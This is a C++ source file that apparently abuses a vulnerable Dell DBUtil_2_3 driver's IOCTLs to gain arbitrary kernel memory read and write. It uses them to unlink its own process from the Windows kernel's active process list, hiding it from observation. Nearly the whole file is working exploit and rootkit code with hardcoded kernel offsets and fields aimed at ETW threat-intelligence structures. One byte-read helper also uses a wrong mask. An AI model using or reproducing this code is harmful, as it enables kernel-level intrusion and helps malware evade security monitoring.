// HideMyAss.cpp : 此檔案包含 'main' 函式。程式會於該處開始執行及結束執行。
//

#include <iostream>
#include <windows.h>
#include <Psapi.h>
#include "typedefs.h"

HANDLE Device;
CLIENT_ID ourProc;
DWORD64 systemEprocessAddr;

static const DWORD DBUTIL_READ_IOCTL = 0x9B0C1EC4;
static const DWORD DBUTIL_WRITE_IOCTL = 0x9B0C1EC8;

DWORD64 GetKernelBaseAddress() {
	DWORD cb = 0;
	LPVOID drivers[1024];

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb)) {
		return (DWORD64)drivers[0];
	}
	return NULL;
}

DWORD ReadPrimitive(DWORD64 Address) {
	DBUTIL_READ_BUFFER ReadBuff{};
	ReadBuff.Address = Address;
	DWORD BytesRead;
	DeviceIoControl(Device,
		DBUTIL_READ_IOCTL,
		&ReadBuff,
		sizeof(ReadBuff),
		&ReadBuff,
		sizeof(ReadBuff),
		&BytesRead,
		nullptr);
	return ReadBuff.value;
}

void WritePrimitive(DWORD64 Address, long long Value) {
	DBUTIL_WRITE_BUFFER WriteBuff{};
	WriteBuff.Address = Address;
	WriteBuff.Value = Value;

	DWORD BytesWritten = 0;

	DeviceIoControl(Device,
		DBUTIL_WRITE_IOCTL,
		&WriteBuff,
		sizeof(WriteBuff),
		&WriteBuff,
		sizeof(WriteBuff),
		&BytesWritten,
		nullptr);
}
BYTE ReadBYTE(DWORD64 Address) {
	return ReadPrimitive(Address) & 0xffffff;
}


WORD ReadWORD(DWORD64 Address) {
	return ReadPrimitive(Address) & 0xffff;
}

DWORD ReadDWORD(DWORD64 Address) {
	return ReadPrimitive(Address);
}

DWORD64 ReadDWORD64(DWORD64 Address) {
	return (static_cast<DWORD64>(ReadDWORD(Address + 4)) << 32) | ReadDWORD(Address);
}

void WriteDWORD64(DWORD64 Address, long long Value) {
	WritePrimitive(Address, Value);
}

ULONG64 kernelBase;
DWORD64 PsInitialSystemProcess()
{
	DWORD64 res = 0;
	ULONG64 ntos = (ULONG64)LoadLibrary(L"ntoskrnl.exe");
	ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	if (kernelBase) {
		res = ReadDWORD64(addr - ntos + kernelBase);
	}
	return res;
}


class NtoskrnlOffsetsBuild
{

public:
	DWORD64 ActiveProcessLinks;
	DWORD64 UniqueProcessId;
	DWORD64 ThreadListHead;
	DWORD64 Protection;
	DWORD64 Token;
	DWORD64 ObjectTable;
	DWORD64 TrapFrame;
	DWORD64 Rip;
	DWORD64 ThreadListEntry;
	DWORD64 Cid;
	DWORD64 EtwThreatIntProvRegHandle;
	DWORD64 GuidEntry;
	DWORD64 EnableInfo;
	DWORD64 Guid;
};

NtoskrnlOffsetsBuild Offsets = { 0x448,0x440,0x5e0, 0x87a,0x4b8,0x570, 0x90, 0x168, 0x4e8, 0x478, 0xc19838, 0x20, 0x60, 0x28 };
 
//pid 4 as stop 
DWORD64 LookupEprocessByPid(DWORD64 papaProc, CLIENT_ID procid) {
	DWORD64 ActiveProcLinkPointer = papaProc + Offsets.ActiveProcessLinks;
	DWORD64 nextFlinkAddr = ReadDWORD64(ActiveProcLinkPointer);
	DWORD64 nextEproccess = nextFlinkAddr - Offsets.ActiveProcessLinks;
	DWORD64 targetPID = ReadDWORD64(nextEproccess + Offsets.UniqueProcessId);
	while (targetPID != (DWORD64)procid.UniqueProcess) {
		nextFlinkAddr = ReadDWORD64(nextEproccess + Offsets.ActiveProcessLinks);
		nextEproccess = nextFlinkAddr - Offsets.ActiveProcessLinks;
		targetPID = ReadDWORD64(nextEproccess + Offsets.UniqueProcessId);
	}
	return nextEproccess;
}

void HideMyProcess(CLIENT_ID OurProc) {

	DWORD64 ourEproc = LookupEprocessByPid(systemEprocessAddr, OurProc);
	DWORD64 ourFlink = ReadDWORD64(ourEproc + Offsets.ActiveProcessLinks);
	DWORD64 ourBlink = ReadDWORD64(ourEproc + Offsets.ActiveProcessLinks + 0x8);
	WriteDWORD64(ourBlink, ourFlink);
	WriteDWORD64(ourFlink + 8, ourBlink);
	WriteDWORD64(ourEproc + Offsets.ActiveProcessLinks, 0);
	WriteDWORD64(ourEproc + Offsets.ThreadListEntry + 0x8, 0);
	std::cout << "[#]Cant see me (-john cena)" << std::endl;

}

int main()
{
	DWORD64 EtwProvRegHandle;
	DWORD64 GUIDRegEntryAddress;

	systemEprocessAddr = PsInitialSystemProcess();
	DWORD64 ourEproc;

	Device = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (Device == INVALID_HANDLE_VALUE) {
		std::cout << "Unable to obtain a handle to the device object: " << GetLastError() << std::endl;
		ExitProcess(0);
	}
	kernelBase = GetKernelBaseAddress();
	systemEprocessAddr = PsInitialSystemProcess();

	HideMyProcess( CLIENT_ID { (HANDLE)GetCurrentProcessId(), nullptr});
}